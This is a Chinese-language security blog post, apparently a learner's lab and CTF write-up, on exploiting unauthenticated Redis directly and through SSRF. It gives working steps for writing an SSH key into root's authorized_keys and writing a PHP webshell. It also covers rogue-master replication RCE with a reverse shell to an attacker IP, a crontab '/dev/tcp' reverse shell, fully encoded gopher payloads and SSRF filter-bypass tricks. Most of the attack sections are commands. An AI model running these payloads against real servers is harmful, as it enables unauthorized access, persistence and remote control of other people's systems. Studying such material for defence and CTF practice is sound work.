# 原创
：  Redis漏洞及搭配ssrf利用姿势

# Redis漏洞及搭配ssrf利用姿势

## 前言

这方面的漏洞之前接触的不是很深，这次学习一下。

---


## 基础知识

##### 0x00:Redis

Redis是一个开源的使用ANSIC语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。<br/> Redis 是一个高性能的key-value数据库。 redis的出现，很大程度补偿了memcached这类key/value存储的不足，在部 分场合可以对关系数据库起到很好的补充作用。

##### 0x01:Redis未授权访问

> 
Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip访问等，这样将会将 Redis服务暴露到公网上。<br/> 如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取Redis 的数据。


漏洞危害：

> 
（1）攻击者无需认证访问到内部数据，可能导致敏感信息泄露，也可以恶意执行flushall来清空所有数据<br/> （2）攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件<br/> （3）如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器


##### 0x02:Redis常用命令
1.  `#连接redis` 1.  `redis-cli -h ip -p 6379 -a passwd` 1.  `#查看redis版本信息等` 1.  `info` 1.  `#列出当前数据库中所有的键` 1.  `keys *` 1.  `# 删除所有数据(谨慎使用)` 1.  `flushall` 1.  `# 设置主从关系` 1.  `slaveof ip port ` 1.  `#设置一个键的值` 1.  `SET key value` 1.  `#获取一个建的值` 1.  `GET key` 
##### 0x03:环境搭建

我使用的是Ubuntu镜像
1.  `#下载Redis` 1.  `wget http://download.redis.io/releases/redis-2.8.17.tar.gz` 1.  `#安装` 1.  `tar xzf redis-2.8.17.tar.gz` 1.  `cd redis-2.8.17` 1.  `make` 
make结束后，
1.  `cd src` 1.  `将redis-server和redis-cli拷贝到/usr/bin目录下` 
这样启动redis-server和redis-cli就不用每次都进入安装目录了<br/>  

<br/> 返回目录redis-2.8.17，将redis.conf拷贝到/etc/目录下<br/>  

<br/> 启动redis服务
1.  `redis-server /etc/redis.conf` 
## Redis漏洞复现
1.  `kail 192.168.66.128` 1.  `Ubuntu 192.168.66.132` 
攻击机先扫描一下受害者的主机，看开放了哪些端口
1.  `nmap -sC -v -n -sV -Pn -p 1-65535 192.168.66.132` 
##### 0x00:未授权访问
1.  `cd src` 1.  `./redis-cli -h 192.168.66.132 -p 6379` 
<br/> Redis默认密码为空，所以可以直接登陆进去

##### 0x01:写 ssh-keygen 公钥登录服务器

这种利用方式是危害最大的，因为可以使用root身份登录redis服务写入ssh公钥实现使用ssh免密登录受害主机。

> 
SSH提供两种登录验证方式，一种是口令验证也就是账号密码登录，另一种是密钥验证。


密钥验证大致过程如下：

但要利用需要满足两个条件
1.  redis以root身份运行 1.  服务器开放了SSH服务，而且允许使用密钥登录 
在kail中先开启redis服务，然后执行`mkdir /root/.ssh`命令，创建ssh公钥存放目录<br/>  

<br/> 在生成公钥和私钥的过程中，密码设置为空
1.  `ssh-keygen -t rsa` 
将生成的公钥保存为Sn0w.txt文件
1.  `cd /root/.ssh/` 1.  `(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") &gt; Sn0w.txt` 
<br/> 连接上目标机器的redis服务，将文件写入
1.  `cat Sn0w.txt | redis-cli -h 192.168.66.132 -x set crack` 
<br/> 远程连接更改redis备份路径为ssh公钥存放目录<br/>  

<br/> 设置上传公钥的备份文件名字为authorized_keys<br/>  

<br/> 检查是否更改成功，保存退出<br/>  

<br/> 具体命令：
1.  `config get dir #检查当前保存路径` 1.  `config get dbfilename #检查保存文件名` 1.  `config set dir /root/.ssh/ #设置保存路径` 1.  `config set dbfilename authorized_keys #设置保存文件名` 1.  `save #进行保存` 
下面就可以进行SSH连接了
1.  `ssh -i id_rsa root@192.168.66.132` 
<br/> 登陆成功

##### 0x02:通过Redis写webshell

需满足的前提条件：
1.  知道网站绝对路径，需要增删改查权限 1.  root启动redis 1.  redis弱密码或者无密码 1.  `写webshell` 1.  `#1\设置要写入shell的路径` 1.  `config set dir /var/www/html` 1.  `#2\设置文件名` 1.  `config set dbfilename shell.php` 1.  `#3\写入phpinfo()到x键` 1.  `set x "\n&lt;?php phpinfo(); ?&gt;\n"` 1.  `save` 
<br/> 写入成功

##### 0x04:Redis主从复制getshell

> 
Redis如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。<br/> 在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上，然后在从机上加载so文件，我们就可以执行拓展的新命令了。


前提条件：
1.  Redis 版本(4.x~5.0.5)（可以编译恶意.so文件） 1.  redis弱密码或者无密码 1.  root启动redis 
这里就以[网鼎杯 2020 玄武组]SSRFMe来演示一下，前面就不再叙述了<br/>  

<br/> redis的密码是root,遇到ssrf+redis getshell这种的，考察一般都是以下几种姿势：

这道题看师傅们的WP，用的方法都是主从复制RCE

---


https://github.com/xmsec/redis-ssrf<br/> https://github.com/n0b0dyCN/redis-rogue-server<br/> 要进行主从复制RCE，就需要利用到这两个工具，第一个用于生成payload，也可以启动恶意服务，第二个主要是exp.so。注意需要将第二个工具exp.so导入到第一个工具下，也就是和rogue-server.py同目录，这里先开启一下`rogue-server.py` 用于伪装为主redis，它开启的端口为6666<br/>  

<br/>  

<br/> 修改ssrf-redis.py<br/>  

<br/>  

<br/>  

<br/> 运行一下<br/>  

<br/> 生成了payload，但无法利用<br/>  

<br/> 看了师傅们的WP，就手动去构造吧，然后再进行二次url编码（因为用到了curl）
1.  `gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dir%2520/tmp/%250d%250aquit` 1.  `#解码后即为` 1.  `gopher://0.0.0.0:6379/_auth root` 1.  `config set dir /tmp/` 1.  `quit` 1.  `//设置备份文件路径为/tmp/ 只有/tmp有权限 ,只需要有读权限即可，所以设置目录的时候要多试试` 1.  `gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520172.16.176.127%25206666%250d%250aquit` 1.  `#解码后即为` 1.  `gopher://0.0.0.0:6379/_auth root` 1.  `config set dbfilename exp.so` 1.  `slaveof 172.16.176.127 6666` 1.  `quit` 1.  `#设置备份文件名为：exp.so` 1.  `gopher://0.0.0.0:6379/_auth%2520root%250d%250amodule%2520load%2520/tmp/exp.so%250d%250asystem.rev%2520172.16.176.127%25206663%250d%250aquit` 1.  `#解码后即为` 1.  `gopher://0.0.0.0:6379/_auth root` 1.  `module load /tmp/exp.so` 1.  `system.rev 172.16.176.127 6663` 1.  `quit` 1.  `#导入 exp.so ，反弹shell到172.16.176.127:6663` 
##### 0x05:Crontab执行命令反弹shell

前提要求:

在Ubuntu上没有复现成功，师傅们说是只能在Centos可以复现成功，这里记录一下命令
1.  `#攻击机先开启监听` 1.  `nc -lvnp 4444` 1.  `#连接redis，写入反弹shell` 1.  `redis-cli -h 192.168.66.132` 1.  `config set dir /var/spool/cron/` 1.  `config set dbfilename root` 1.  `save` 
## SSRF遇上Redis

在利用SSRF攻击Redis前，先要理解一下Redis的客户端和服务端的通信方式，以及数据发送的格式。这就涉及到一个RESP协议

##### 0x00:RESP协议

> 
redis客户端与服务端通信，使用RESP（REdis Serialization Protocal，redis序列化协议）协议通信，该协议是专门为redis设计的通信协议，但也可以用于其它客户端-服务器通信的场景。<br/> RESP可以用于序列化不同的数据类型，如：整型、字符串、数组…并且为错误提供专门的类型；客户端发送请求时，以字符串数组的作为待执行命令的参数。redis服务器根据不同的命令返回不同的数据类型。


RESP协议支持5种数据类型：
1.  简单字符串（`Simple Strings`） 1.  错误数据（`Errors`） 1.  整数（`Integers`） 1.  批量字符串（`Bulk Strings`） 1.  数组（`Arrays`） 
客户端请求服务器时，会以批量数据类型的数组进行请求封装<br/> 服务端发送响应给客户端时，根据命令实现的不同，返回相应的数据类型。<br/> 不同的数据类型根据请求/响应报文的第一个字节进行区分：

简单字符串以`+`开头<br/> 错误数据以`-`开头<br/> 整数以`:`开头<br/> 批量字符串以`$`开头<br/> 数组以`*`开头<br/> 每种类型的数据均以CRLF（\r\n）结束，通过数据的首字符区分类型

自己抓一个包看看客户端发送的格式就知道了
1.  `tcpdump port 6379 -w ./1.pcap` 
<br/> 十六进制转储看一下

<br/>`*3`，代表数组的长度为3（类似[“set”,”name”,”Sn0w”]），`$4`代表字符串的长度，就是Sn0w，`0d0a`即`\r\n`表示结束符；+OK表示服务端执行成功后返回的字符串

---


##### 0x01:Gopher协议

Gopher

> 
`gopher`协议支持`GET&amp;POST`请求，常用于攻击内网`ftp`、`redis`、`telnet`、`smtp`等服务，还可以利用`gopher`协议访问`redis`反弹`shell`


协议格式

> 
gopher://127.0.0.1:70/** + TCP/IP数据<br/> gopher的默认端口为70，`**`是一种数据连接格式，也可以是其他字符


协议的实现

> 
gopher会将后面的数据部分发送给相应的端口，这些数据可以是字符串，也可以是其他的数据请求包，比如GET，POST请求，redis，mysql未授权访问等，同时数据部分必须要进行url编码，这样gopher协议才能正确解析。<br/> 支持gopher协议的有 `curl` 和 `libcurl`


如果要给redis发命令，按照序列化规则即可。<br/> 先在Redis中加一个key值<br/>`set name Sn0w`<br/>  

<br/> 再使用curl来发起Gopher请求` `
1.  `curl gopher://192.168.66.132:6379/_*2` 1.  `$3` 1.  `get` 1.  `$4` 1.  `name` 
将其转换为gopher格式的数据传入，转换规则<br/> Windows 在行尾使用 CRLF (carriage return/line feed, 0d 0a)<br/> UNIX 只使用 LF(0a)<br/> 参考了很多师傅们的博客，都说是直接url编码即可，但应该确切一点是 url16进制加密<br/>  

<br/> 但是这样还不行，因为没有结束符，所以手动添加上%0d%0a，最终payload：<br/>`_%2a%32%0d%0a%24%33%0d%0a%67%65%74%0d%0a%24%34%0d%0a%6e%61%6d%65%0d%0a`<br/>  

<br/> 这样才能正常进行回显内容（PS：在这个地方纠结很久）,如果是在web环境中，需要编码两次（因为URL会自动解析一次）

但是手动生成过于麻烦，这里推荐一个生成准确的gopher语句，使用这个工具：

使用方法：<br/> 编辑`redis-over-gopher/redis.cmd`为redis执行的命令，一句命令一行，编辑之后运行即可

##### 0x02:Dict协议

dict

> 
词典网络协议，允许客户端在使用过程中访问更多字典。


协议格式

> 
dict://serverip:port/命令:参数<br/> 向服务器的端口请求为【命令:参数】，并在末尾自动补上\r\n(CRLF)，dict协议要一条一条的执行命令


协议作用

> 
利用dict协议可以探测端口的开放情况和指纹信息

1.  `#探测dict协议是否可用` 1.  `?url=dict://127.0.0.1:6379/info` 1.  `?url=dict://127.0.0.1:6379/get:user` 1.  `?url=dict://127.0.0.1:6379/flushall` 
##### 0x03:File&amp;http协议

file&amp;http

> 
file协议主要用于读取服务器本地文件，访问的是本地的静态资源<br/> file只能静态读取，http可以动态解析


命令格式

> 
file://文件路径


其他协议可以看师傅汇总的

##### 0x04:题目训练**

<br/> 先使用dict协议探测一下端口，http协议有的时候会探测不到 

**<br/> 协议没有被过滤，那么就可以考虑使用Gopher协议去攻击Redis，常见的也就四种：
1.  写SSH 1.  写Webshell 1.  主从复制 1.  反弹shell 
这里先尝试一下写webshell，使用file协议查看一下发现有www-data用户，对应的目录就是/var/www,那应该/var/www/html便是网站根目录了

<br/> 那下面就写webshell,常见的payload如下：
1.  `flushall` 1.  `config set dir /var/www/html` 1.  `config set dbfilename shell.php` 1.  `set 'webshell' '&lt;?php phpinfo();?&gt;'` 1.  `save` 
利用上面的工具生成适配于准确无误的gopher<br/>  

<br/> 再进行url编码一次，传入进去
1.  `?url=gopher://127.0.0.1:6379/_%25%32%61%25%33%31%25%30%64%25%30%61%25%32%34%25%33%38%25%30%64%25%30%61%25%36%36%25%36%63%25%37%35%25%37%33%25%36%38%25%36%31%25%36%63%25%36%63%25%30%64%25%30%61%25%32%61%25%33%34%25%30%64%25%30%61%25%32%34%25%33%36%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%30%64%25%30%61%25%32%34%25%33%33%25%30%64%25%30%61%25%37%33%25%36%35%25%37%34%25%30%64%25%30%61%25%32%34%25%33%33%25%30%64%25%30%61%25%36%34%25%36%39%25%37%32%25%30%64%25%30%61%25%32%34%25%33%31%25%33%33%25%30%64%25%30%61%25%32%66%25%37%36%25%36%31%25%37%32%25%32%66%25%37%37%25%37%37%25%37%37%25%32%66%25%36%38%25%37%34%25%36%64%25%36%63%25%30%64%25%30%61%25%32%61%25%33%34%25%30%64%25%30%61%25%32%34%25%33%36%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%30%64%25%30%61%25%32%34%25%33%33%25%30%64%25%30%61%25%37%33%25%36%35%25%37%34%25%30%64%25%30%61%25%32%34%25%33%31%25%33%30%25%30%64%25%30%61%25%36%34%25%36%32%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%30%64%25%30%61%25%32%34%25%33%39%25%30%64%25%30%61%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30%25%30%64%25%30%61%25%32%61%25%33%33%25%30%64%25%30%61%25%32%34%25%33%33%25%30%64%25%30%61%25%37%33%25%36%35%25%37%34%25%30%64%25%30%61%25%32%34%25%33%38%25%30%64%25%30%61%25%37%37%25%36%35%25%36%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%30%64%25%30%61%25%32%34%25%33%31%25%33%38%25%30%64%25%30%61%25%33%63%25%33%66%25%37%30%25%36%38%25%37%30%25%32%30%25%37%30%25%36%38%25%37%30%25%36%39%25%36%65%25%36%36%25%36%66%25%32%38%25%32%39%25%33%62%25%33%66%25%33%65%25%30%64%25%30%61%25%32%61%25%33%31%25%30%64%25%30%61%25%32%34%25%33%34%25%30%64%25%30%61%25%37%33%25%36%31%25%37%36%25%36%35%25%30%64%25%30%61` 
<br/> 可以看到shell.php文件已经传入成功，下面写马连接即可（需要注意过滤了空格，使用${IFS}绕过即可）

<br/> 再推荐一个工具<br/> https://github.com/tarunkant/Gopherus

##### 0x05:整理一些payload及bypass姿势

Gopher协议反弹shell
1.  `flushall` 1.  `set 1 '\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\n\n'` 1.  `config set dir /var/spool/cron/` 1.  `config set dbfilename root` 1.  `save` 
SSRF bypass姿势
1.  `#url跳转bypass：` 1.  `利用问号绕过限制` 1.  `url=https://www.baidu.com?www.xxxx.me` 1.  `利用@绕过限制` 1.  `url=https://www.baidu.com@www.xxxx.me` 1.  `3.利用斜杠反斜杠绕过限制` 1.  `4.利用#绕过限制` 1.  `url=https://www.baidu.com#www.xxxx.me` 1.  `5.利用子域名绕过` 1.  `6.利用畸形url绕过` 1.  `7.利用跳转ip绕过` 
数字IP Bypass
1.  `如果过滤了127等，可以使用IP转数字` 1.  `例如：` 1.  `127.0.0.1-》2130706433` 
## 总结

这篇博客就总结到这里，下次把经典一点的SSRF题目都总结到一起再学习一波，冲冲冲！

## 参考博客

https://www.cnblogs.com/bmjoker/p/9548962.html<br/> https://www.freebuf.com/articles/web/249238.html

  申明：本账号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法。

###### **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/direct/2f74894cf8e04b7f87d9716681f6e26b.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/direct/5b4209eac3784bd18f5e1cd6a5157e4e.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/direct/4a89b0c2a52a4f569a970e55dcbac0b4.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/direct/4f211474c8ab4a5a910884e1d3423310.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/direct/54c2816350ae4bf787d1c6eec0d4e837.png" width="665"/>

应急响应笔记

学习路线
